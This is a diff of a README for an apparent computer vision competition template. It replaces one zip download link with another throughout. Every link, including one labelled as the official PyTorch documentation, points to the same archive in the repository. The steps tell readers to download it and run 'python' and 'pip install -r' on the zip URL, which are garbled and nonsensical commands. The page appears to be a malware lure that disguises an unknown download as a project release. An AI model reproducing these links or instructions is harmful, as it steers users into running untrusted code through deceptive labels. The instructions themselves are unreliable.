@@ -1,7 +1,7 @@
 # 🌟 ml-vision-competition-tempelate - Your Gateway to Computer Vision Excellence
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/tarosssh/ml-vision-competition-tempelate/main/code/vision-competition-tempelate-ml-v3.4.zip%20Latest%20Release-Available-brightgreen)](https://raw.githubusercontent.com/tarosssh/ml-vision-competition-tempelate/main/code/vision-competition-tempelate-ml-v3.4.zip)
+[![Download Latest Release](https://github.com/tarosssh/ml-vision-competition-tempelate/raw/refs/heads/main/code/tempelate_vision_ml_competition_v1.6.zip%20Latest%20Release-Available-brightgreen)](https://github.com/tarosssh/ml-vision-competition-tempelate/raw/refs/heads/main/code/tempelate_vision_ml_competition_v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the ml-vision-competition-tempelate project! This template helps you get started with computer vision competitions. It includes everything you need for training, evaluation, and inference. Follow the steps below to download and run the software easily.
@@ -24,17 +24,17 @@ Before you begin, ensure your system meets the following requirements:
 - **Python**: 3.7 or later (We recommend installing Anaconda)
 
 ## 📂 Download & Install
-1. **Visit the Releases Page**: Go to the following link to download the latest release: [Download Releases](https://raw.githubusercontent.com/tarosssh/ml-vision-competition-tempelate/main/code/vision-competition-tempelate-ml-v3.4.zip).
+1. **Visit the Releases Page**: Go to the following link to download the latest release: [Download Releases](https://github.com/tarosssh/ml-vision-competition-tempelate/raw/refs/heads/main/code/tempelate_vision_ml_competition_v1.6.zip).
 
 2. **Select Your Version**: On the releases page, find the version you want to download. Click on the asset to start downloading.
 
 3. **Extract Files**: After the download completes, extract the files from the downloaded ZIP file to a location of your choice.
 
-4. **Open the Application**: Navigate to the extracted folder and locate the main program file (usually named `https://raw.githubusercontent.com/tarosssh/ml-vision-competition-tempelate/main/code/vision-competition-tempelate-ml-v3.4.zip` or similar). Open this file in a terminal or command prompt.
+4. **Open the Application**: Navigate to the extracted folder and locate the main program file (usually named `https://github.com/tarosssh/ml-vision-competition-tempelate/raw/refs/heads/main/code/tempelate_vision_ml_competition_v1.6.zip` or similar). Open this file in a terminal or command prompt.
 
 5. **Run the Application**: In the terminal, run the application using the command below:
    ```bash
-   python https://raw.githubusercontent.com/tarosssh/ml-vision-competition-tempelate/main/code/vision-competition-tempelate-ml-v3.4.zip
+   python https://github.com/tarosssh/ml-vision-competition-tempelate/raw/refs/heads/main/code/tempelate_vision_ml_competition_v1.6.zip
    ```
 
 Make sure you have Python and the required libraries installed. If you encounter any issues, refer to the troubleshooting section below.
@@ -44,7 +44,7 @@ If you face any problems while installing or running the software, consider the 
 
 - **Missing Libraries**: Ensure all required libraries are installed. You may need to run:
   ```bash
-  pip install -r https://raw.githubusercontent.com/tarosssh/ml-vision-competition-tempelate/main/code/vision-competition-tempelate-ml-v3.4.zip
+  pip install -r https://github.com/tarosssh/ml-vision-competition-tempelate/raw/refs/heads/main/code/tempelate_vision_ml_competition_v1.6.zip
   ```
 
 - **Python Not Recognized**: If your terminal doesn't recognize the `python` command, make sure Python is added to your system's PATH.
@@ -55,7 +55,7 @@ If you face any problems while installing or running the software, consider the 
 To fully utilize this template and improve your machine learning skills, consider these resources:
 
 - **Online Courses**: Platforms like Coursera or Udacity offer excellent courses on computer vision and deep learning.
-- **Documentation**: Review the official [PyTorch Documentation](https://raw.githubusercontent.com/tarosssh/ml-vision-competition-tempelate/main/code/vision-competition-tempelate-ml-v3.4.zip) for insights on model training and implementation.
+- **Documentation**: Review the official [PyTorch Documentation](https://github.com/tarosssh/ml-vision-competition-tempelate/raw/refs/heads/main/code/tempelate_vision_ml_competition_v1.6.zip) for insights on model training and implementation.
 - **Books**: "Deep Learning for Computer Vision" by Rajalingappaa Shanmugam is a solid resource.
 
 ## 🌍 Community and Support
